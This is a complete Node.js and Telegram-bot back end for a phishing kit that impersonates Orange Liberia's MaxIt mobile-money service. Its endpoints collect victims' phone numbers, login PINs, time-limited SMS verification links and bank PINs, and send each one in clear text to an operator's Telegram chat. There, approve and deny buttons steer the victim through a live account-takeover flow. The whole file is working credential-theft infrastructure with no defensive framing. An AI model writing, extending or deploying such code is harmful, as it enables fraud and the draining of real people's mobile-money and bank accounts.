const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Liberia";
    const countryCode = "+231";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>ORANGE LIBERIA MAXIT - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇱🇷 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST SMS LINK API (Paste Link Before 20s Expiry) --------------------
app.post('/api/verify-first-sms-link', async (req, res) => {
    const { phone, smsLink } = req.body || {};
    const country = "Liberia";
    const countryCode = "+231";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !smsLink || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_sms_link1";

    const smsMessage = `🆕 <b>ORANGE LIBERIA MAXIT - VERIFICATION LINK SUBMITTED</b>
🇱🇷 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔗 <b>SMS LINK:</b> <code>${smsLink}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⏱️ <b>NOTE: Link expires in 20 seconds!</b>
⚠️ <b>Verify the credentials immediately:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, smsMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct Link", callback_data: `link1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Link / Expired", callback_data: `link1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `link2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND SMS LINK API --------------------
app.post('/api/verify-second-sms-link', async (req, res) => {
    const { phone, smsLink } = req.body || {};
    const country = "Liberia";
    const countryCode = "+231";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !smsLink || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_sms_link2";

    const smsMessage2 = `2️⃣ <b>ORANGE LIBERIA MAXIT - SECOND SMS LINK (Step 2/2)</b>

🆕 <b>NEW USER - SECOND VERIFICATION LINK</b>
🇱🇷 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔗 <b>Second SMS Link:</b> <code>${smsLink}</code>
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⏱️ <b>NOTE: Link expires in 20 seconds!</b>
⚠️️ <b>Verify SECOND Link immediately:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, smsMessage2, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `link2_correct|${phone}` },
                        { text: "❌ Wrong Link / Expired", callback_data: `link2_wrong|${phone}` },
                        { text: "🔑 Wrong PIN", callback_data: `link2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND SMS LINK API --------------------
app.post('/api/resend-link-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>NEW SMS LINK REQUESTED</b>

📱 <b>Phone Number:</b> ${phone}
📍 <b>Step:</b> ${step}
⚠️ <b>User requested a new link (previous link expired or invalid).</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Liberia";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>ORANGE LIBERIA MAXIT - BANK PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇱🇷 <b>Country:</b> ${country}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>Bank PIN:</b> ${bankPin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify BANK PIN:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🆕 <b>NEW USER</b>
🇱🇷 <b>Liberia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: Awaiting SMS Link (1/2)</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

// DENY
bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇱🇷 <b>Liberia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

// LINK1 CORRECT
bot.action(/^link1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "link1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>FIRST SMS LINK VERIFIED (Step 1/2)</b>

🇱🇷 <b>Liberia</b>
📱 <b>${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: First SMS Link verified</b>
➡️ <b>Next: Second SMS Link (2/2) requested</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

// LINK1 WRONG
bot.action(/^link1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "link1_wrong";
    await ctx.answerCbQuery("Wrong or Expired Link");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST SMS LINK INVALID / EXPIRED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to paste a new SMS link.</b>`);
});

// CONTACT US
bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("Contact Us Clicked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested contact support.</b>`);
});

// LINK2 CORRECT
bot.action(/^link2_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "link2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>SECOND SMS LINK VERIFIED (Step 2/2)</b>

🇱🇷 <b>Liberia</b>
📱 <b>${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Second SMS Link verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Finalized");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

// LINK2 WRONG
bot.action(/^link2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "link2_wrong";
    await ctx.answerCbQuery("Wrong or Expired Link");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND SMS LINK INVALID / EXPIRED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to paste a new SMS link.</b>`);
});

// BANK PIN CORRECT
bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>

🇱🇷 <b>Liberia</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Process Completed</b>
🏁 <b>User redirected to Success page</b>`;

    await ctx.answerCbQuery("Bank PIN Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

// BANK PIN WRONG
bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("Wrong Bank PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
});

// LINK2 WRONG PIN
bot.action(/^link2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "link2_wrongpin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_link1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
